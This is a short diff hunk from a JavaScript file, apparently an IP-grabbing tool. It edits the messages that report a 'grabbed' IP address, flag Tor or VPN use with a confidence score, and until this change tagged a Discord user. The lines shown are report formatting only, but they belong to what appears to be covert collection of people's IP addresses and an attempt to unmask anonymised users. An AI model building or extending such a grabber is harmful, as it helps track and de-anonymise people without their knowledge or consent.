@@ -2123,12 +2123,12 @@ async function collectAndSendInfo() {
             
             // 특별 케이스
             if (detection.isTor) {
-                return `Grabbed \`${ip}\` by <@1173942304927645786> 🔴 **[TOR 네트워크 감지!]** (신뢰도: ${detection.confidence}%)`;
+                return `Grabbed \`${ip}\` 🔴 **[TOR 네트워크 감지!]** (신뢰도: ${detection.confidence}%)`;
             } else if (detection.isVPN && detection.riskLevel === 'critical') {
-                return `Grabbed \`${ip}\` by <@1173942304927645786> 🔴 **[VPN 확실!]** (신뢰도: ${detection.confidence}%)`;
+                return `Grabbed \`${ip}\` 🔴 **[VPN 확실!]** (신뢰도: ${detection.confidence}%)`;
             }
             
-            return `Grabbed \`${ip}\` by <@1173942304927645786> ${emoji} ${text}`;
+            return `Grabbed \`${ip}\` ${emoji} ${text}`;
         }
 
         const contentMessage = getContentMessage(
